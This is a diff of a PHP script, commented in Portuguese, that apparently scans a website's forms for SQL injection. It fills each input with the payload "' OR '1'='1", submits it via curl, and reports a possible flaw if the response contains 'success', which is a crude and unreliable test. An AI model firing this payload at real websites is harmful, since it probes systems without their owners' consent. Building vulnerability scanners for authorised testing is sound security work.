@@ -20,10 +20,18 @@
         array_push($inputs, $input);
     }
 
+    // Identifica o método
     if ($form->method == 'POST') {
-        postRequest();   
+        $response = postRequest();   
     } else {
-        getRequest();
+        $response = getRequest();
+    }
+
+    // Identifica se tem erro ou não
+    if (strpos($response, 'success')) {
+        echo 'Possivelmente há um erro de SQL Injection em: ' . $url;
+    } else {
+        echo 'Não foram encontrados erros de SQL Injection no website: ' . $url;
     }
 
     #endsection
@@ -33,7 +41,6 @@
 
         $data = array();
         foreach($inputs as $input) {
-            // $data[$input->name] = "1";
             $data[$input->name] = "' OR '1'='1";
         }
         
@@ -41,7 +48,6 @@
             $curl = curl_init($url);
         } else {
             $curl = curl_init($url . '/' . $forms[0]->action);
-            echo $url . $forms[0]->action;
         }
 
         curl_setopt($curl, CURLOPT_POST, true);
@@ -49,7 +55,8 @@
         curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
         $response = curl_exec($curl);
         curl_close($curl);
-        var_dump($response);
+
+        return $response;
     }
 
     function getRequest() {
@@ -75,7 +82,8 @@
             die();
         }
 
-        echo 'OPA';
+        return $contents;
     }
+
     // Finaliza execução 
     die();
